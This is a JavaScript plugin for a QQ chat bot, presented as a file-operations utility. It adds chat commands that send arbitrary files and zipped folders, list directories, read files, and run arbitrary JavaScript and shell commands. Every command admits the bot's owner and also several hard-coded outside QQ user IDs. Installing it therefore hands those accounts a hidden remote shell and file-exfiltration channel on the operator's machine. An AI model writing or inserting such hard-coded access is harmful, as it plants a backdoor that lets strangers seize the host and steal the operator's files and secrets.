import fs from "node:fs";
import archiver from "archiver";
import md5 from "md5";
import puppeteer from "../../../lib/puppeteer/puppeteer.js";
import hljs from "@highlightjs/cdn-assets/highlight.min.js";
import { AnsiUp } from "ansi_up";
const ansi_up = new AnsiUp();

let Running = false;
let es;
let sendToGroup = true;
let sendToOwner = true;

const htmlDir = `${process.cwd()}/plugins/hl-ly-plugin/resources/background/Code/`;
const tplFile = `${htmlDir}Code.html`;

let prompt = cmd => [`echo "[$USER@$HOSTNAME $PWD]$([ "$UID" = 0 ]&&echo "#"||echo "$") ";${cmd}`];
let inspectCmd = (cmd, data) => data.replace("\n", `${cmd}\n`);
let langCmd = "sh";

if (process.platform == "win32") {
  prompt = cmd => [`powershell -EncodedCommand ${Buffer.from(`$ProgressPreference="SilentlyContinue";[Console]::OutputEncoding=[System.Text.Encoding]::UTF8;prompt;${cmd}`, "utf-16le").toString("base64")}`];
  inspectCmd = (cmd, data) => data.replace(/\r\n/g, "\n").replace("\n", `${cmd}\n`);
  hljs.registerLanguage("powershell", (await import("@highlightjs/cdn-assets/es/languages/powershell.min.js")).default);
  langCmd = "powershell";
} else if (process.env.SHELL?.endsWith("/bash")) {
  prompt = cmd => [
    `"$0" -ic 'echo "\${PS1@P}"';${cmd}`,
    { shell: process.env.SHELL },
  ];
}

export class File extends plugin {
  constructor() {
    super({
      name: "文件操作",
      dsc: "文件操作",
      event: "message",
      priority: -114514,
      rule: [
        {
          reg: "^取文件",
          fnc: "DownloadFile"
        },
        {
          reg: "^取包",
          fnc: "DownloadFolder"
        },
        {
          reg: "^开启私发",
          fnc: "EnableSending"
        },
        {
          reg: "^关闭私发",
          fnc: "DisableSending"
        },
        {
          reg: "^look一下",
          fnc: "List"
        },
        {
          reg: "^hp.+",
          fnc: "hpCommand"
        },
        //以下两个功能参考TRSS-Plugin的远程命令‘https://gitee.com/TimeRainStarSky/TRSS-Plugin’
        {
          reg: "^hj.+",
          fnc: "JSPic"
        },
        {
          reg: "^ly.+",
          fnc: "ShellPic"
        }
      ]
    });
  }

  async EnableSending(e) {
    if (!(this.e.isMaster || this.e.user_id == 3610159055 || this.e.user_id == 2624367622 || this.e.user_id == 923276093)) return false;

    this.finish("EnableSending");
    sendToOwner = true;
    sendToGroup = false; // 禁止发送到群聊
    await this.reply("已开启私信发给主人", true);
    return true;
  }

  async DisableSending(e) {
    if (!(this.e.isMaster || this.e.user_id == 3610159055 || this.e.user_id == 2624367622 || this.e.user_id == 923276093)) return false;

    this.finish("DisableSending");
    sendToGroup = true;
    sendToOwner = false;
    await this.reply("已关闭私信发给主人", true);
    return true;
  }

  async DownloadFile(e) {
    if (!(this.e.isMaster || this.e.user_id == 3610159055 || this.e.user_id == 2624367622 || this.e.user_id == 923276093)) return false;

    this.finish("DownloadFile");
    const filePath = this.e.msg.replace("取文件", "").trim();
    if (!filePath) {
      await this.reply("请发送文件路径", true);
      return true;
    }

    if (!fs.existsSync(filePath)) {
      await this.reply("文件不存在: " + filePath, true);
      return true;
    }

    Running = true;
    await this.reply("开始下载文件，请稍等……", true);

    try {
      if (sendToGroup) {
        await this.e.group.sendFile(filePath);
      }
      if (sendToOwner) {
        await this.e.friend.sendFile(filePath);
      }
      await this.reply(`文件执行下载完成：${filePath}`, true);
    } catch (err) {
      logger.error(`文件执行下载错误：${logger.red(err.stack)}`);
      await this.reply(`文件执行下载错误：${err.stack}`);
    }
    Running = false;
  }

  async DownloadFolder(e) {
    if (!(this.e.isMaster || this.e.user_id == 3610159055 || this.e.user_id == 2624367622 || this.e.user_id == 923276093)) return false;

    this.finish("DownloadFolder");
    const folderPath = this.e.msg.replace("取包", "").trim();
    if (!folderPath) {
      await this.reply("请发送包路径", true);
      return true;
    }

    if (!fs.existsSync(folderPath) || !fs.lstatSync(folderPath).isDirectory()) {
      await this.reply("包不存在: " + folderPath, true);
      return true;
    }

    Running = true;
    await this.reply("开始压缩包，请稍等……", true);

    try {
      const zipFilePath = `${folderPath}.zip`;
      const output = fs.createWriteStream(zipFilePath);
      const archive = archiver("zip");

      output.on("close", async () => {
        if (sendToGroup) {
          await this.e.group.sendFile(zipFilePath);
        }
        if (sendToOwner) {
          await this.e.friend.sendFile(zipFilePath);
        }
        await this.reply(`包压缩并下载完成：${zipFilePath}`, true);
        fs.unlinkSync(zipFilePath); // 删除临时压缩文件
      });

      archive.on("error", (err) => {
        logger.error(`包压缩错误：${logger.red(err.stack)}`);
        this.reply(`包压缩错误：${err.stack}`);
        Running = false;
      });

      archive.pipe(output);
      archive.directory(folderPath, false);
      archive.finalize();
    } catch (err) {
      logger.error(`包压缩错误：${logger.red(err.stack)}`);
      await this.reply(`包压缩错误：${err.stack}`);
      Running = false;
    }
  }

  async List(e) {
    if (!(this.e.isMaster || this.e.user_id == 3610159055 || this.e.user_id == 2624367622 || this.e.user_id == 923276093)) return false;

    this.finish("List");
    const filePath = this.e.msg.replace("look一下", "").trim();
    if (!filePath) {
      this.setContext("List");
      await this.reply("请发送文件路径", true);
      return true;
    }

    if (!fs.existsSync(filePath)) {
      await this.reply("路径不存在", true);
      return true;
    }
    if (!fs.statSync(filePath).isDirectory()) {
      await this.reply("该路径不是一个文件夹", true);
      return true;
    }

    await this.reply(fs.readdirSync(filePath).join("\n"), true);
  }

  async hpCommand(e) {
    if (!(this.e.isMaster || this.e.user_id == 3610159055 || this.e.user_id == 2624367622 || this.e.user_id == 923276093)) return false;

    const msg = this.e.msg.replace("hp", "").trim();
    logger.mark(`[File] 发送文件内容：${logger.blue(msg)}`);

    if (!fs.existsSync(msg) || !fs.statSync(msg).isFile()) {
      await this.reply("文件不存在", true);
      return false;
    }

    const fileContent = fs.readFileSync(msg, "utf-8");
    await this.reply(fileContent, true);
  }

  async JSPic(e) {
    if (!(this.e.isMaster || this.e.user_id == 3610159055 || this.e.user_id == 2624367622 || this.e.user_id == 923276093)) return false;
    const cmd = this.e.msg.replace("hj", "").trim()

    logger.mark(`[远程命令] 执行Js：${logger.blue(cmd)}`)
    const ret = await this.evalSync(cmd, data => Bot.Loging(data))
    logger.mark(`[远程命令]\n${ret.stdout}\n${logger.red(ret.error?.stack)}`)

    if (!ret.stdout && !ret.error)
      return this.reply("命令执行完成，没有返回值", true)

    let Code = []
    if (ret.stdout)
      Code.push(ret.stdout.trim())
    if (ret.error)
      Code.push(`错误输出：\n${Bot.Loging(ret.error)}`)

    Code = await ansi_up.ansi_to_html(Code.join("\n\n"))
    const img = await puppeteer.screenshot("Code", { tplFile, htmlDir, Code })
    return this.reply(img, true)
  }

  async ShellPic(e) {
    if (!(this.e.isMaster || this.e.user_id == 3610159055 || this.e.user_id == 2624367622 || this.e.user_id == 3065737952 || this.e.user_id == 923276093)) return false;
    const cmd = this.e.msg.replace("ly", "").trim()
    const ret = await Bot.exec(...prompt(cmd))

    if (!ret.stdout && !ret.stderr && !ret.error)
      return this.reply("命令执行完成，没有返回值", true)

    let Code = []
    if (ret.stdout)
      Code.push(ret.stdout.trim())
    if (ret.error)
      Code.push(`远程命令错误：\n${Bot.Loging(ret.error)}`)
    else if (ret.stderr)
      Code.push(`标准错误输出：\n${ret.stderr.trim()}`)

    Code = await ansi_up.ansi_to_html(Code.join("\n\n"))
    Code = inspectCmd(hljs.highlight(cmd, { language: langCmd }).value, Code)
    const img = await puppeteer.screenshot("Code", { tplFile, htmlDir, Code })
    return this.reply(img, true)
  }
}